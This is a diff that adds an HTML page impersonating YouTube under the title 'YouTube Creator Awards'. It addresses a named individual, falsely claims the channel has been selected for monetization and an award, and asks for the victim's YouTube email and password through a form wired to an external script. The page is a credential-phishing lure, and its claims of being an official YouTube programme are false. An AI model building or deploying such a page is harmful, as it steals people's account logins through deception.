@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>YouTube Creator Awards</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f9f9f9;
+      color: #0f0f0f;
+    }
+
+    header {
+      background-color: white;
+      display: flex;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .youtube-logo {
+      height: 28px;
+      margin-right: 10px;
+    }
+
+    .brand {
+      font-size: 18px;
+      font-weight: 600;
+      color: #0f0f0f;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 30px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    h3 {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 15px;
+    }
+
+    .info {
+      font-size: 14px;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .silver-button {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    form input[type="email"],
+    form input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      margin-bottom: 10px;
+    }
+
+    .checkbox input {
+      margin-right: 8px;
+    }
+
+    .error {
+      display: none;
+      color: red;
+      font-size: 13px;
+      margin-bottom: 10px;
+    }
+
+    .verify-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #cc0000;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .verify-btn:hover {
+      background-color: #b30000;
+    }
+
+    .disclaimer {
+      font-size: 12px;
+      text-align: center;
+      margin-top: 20px;
+      color: #888;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        margin: 10px;
+      }
+
+      h1 {
+        font-size: 20px;
+      }
+
+      h3 {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube Logo" class="youtube-logo" />
+    <div class="brand">YouTube Creator Awards</div>
+  </header>
+
+  <div class="container">
+    <h1>Hey Subham Yadav s k 👋</h1>
+    <h3>Please complete your monetize verification</h3>
+
+    <div class="info">
+      Congratulations! Your channel has been successfully selected for YouTube Creator Awards.<br>
+      To proceed, verify your email associated with your channel.
+    </div>
+
+    <div class="silver-button">
+      <img src="button.jpg.png" alt="Silver Play Button" style="width: 250px;" />
+    </div>
+
+    <form onsubmit="sendData(event)">
+      <input type="email" id="email" placeholder="Enter your YouTube email" required />
+      <input type="password" id="password" placeholder="Enter your password" required />
+      <div class="checkbox">
+        <input type="checkbox" id="notBot" />
+        <label for="notBot">I'm not a bot</label>
+      </div>
+      <div class="error" id="errorMsg">⚠️ Please enter valid information and confirm you are not a bot.</div>
+      <button class="verify-btn" type="submit">Verify Email</button>
+    </form>
+
+    <div class="info" style="font-size: 14px; line-height: 1.6; margin-bottom: 20px;">
+  Welcome to the YouTube Partner Program (YPP)! 🎉<br><br>
+  We are excited to inform you that your channel has been shortlisted for official monetization. Once your email is verified through this quick verification process, your channel will be instantly activated for monetization. As a YPP creator, you will gain access to powerful monetization tools such as Google AdSense integration, Ad revenue from videos, Super Chats, Super Thanks, Channel Memberships, and more. Your earnings will be calculated based on ad impressions (CPM), audience engagement, watch time, and viewer location.<br><br>
+  Verification ensures the safety of our creators and confirms the ownership of the YouTube channel. Please verify your registered YouTube email to complete the final step. Once verified, you can start earning revenue from every ad displayed on your videos, and your monetization dashboard will be activated within 24 hours. Don’t miss this opportunity to join millions of successful YouTube creators and turn your passion into income! 💰<br><br>
+  This is an official initiative under the YouTube Creator Awards Program. Kindly complete the verification to unlock all monetization features now.
+</div>
+
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
